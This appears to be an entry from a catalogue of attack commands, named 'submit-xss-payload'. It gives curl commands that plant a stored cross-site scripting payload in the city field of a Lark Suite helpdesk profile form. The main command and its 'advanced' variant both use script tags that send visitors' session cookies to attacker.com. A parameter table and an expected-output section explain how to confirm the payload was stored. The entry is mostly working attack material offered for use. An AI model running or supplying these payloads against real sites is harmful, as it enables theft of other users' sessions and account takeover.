---
data: >-
  curl -X POST 'https://larksuite-helpdesk.example.com/profile/update' -H
  'Cookie: session=your_session' -d
  'city=<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'
  -d 'other_fields=values'
tags:
  - xss
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:18.483Z'
id: 021c1372-22b3-430f-b096-a7ecba9c88eb
verified: false
validated: true
submitted: true
---
# submit-xss-payload

## Command

```bash
curl -X POST 'https://larksuite-helpdesk.example.com/profile/update' \
  -H 'Cookie: session=your_session' \
  -d 'city=<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>' \
  -d 'other_fields=values'
```

## Description

Submits a stored XSS payload to the Lark Suite helpdesk profile update endpoint via the city field, exploiting lack of sanitization to store malicious JavaScript.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H 'Cookie: ...'` | Authenticates the request with session cookie | Yes |
| `-d 'city=...'` | Payload in city field for injection | Yes |
| `-d 'other_fields=...'` | Additional form data to complete submission | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/update' -H 'Cookie: session=abc' -d 'city=<script>alert(1)</script>'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/update' -H 'Cookie: session=abc' -d 'city=<script>fetch("http://attacker.com?data="+btoa(document.cookie))</script>' -d 'name=test' -d 'email=test@example.com'
```

## Expected Output

HTTP 200 OK response with success message or redirected profile page, indicating the payload was accepted and stored.

## Related

- [[Related Procedure|procedures/Inject-Stored-XSS-Payload-in-City-Field]]
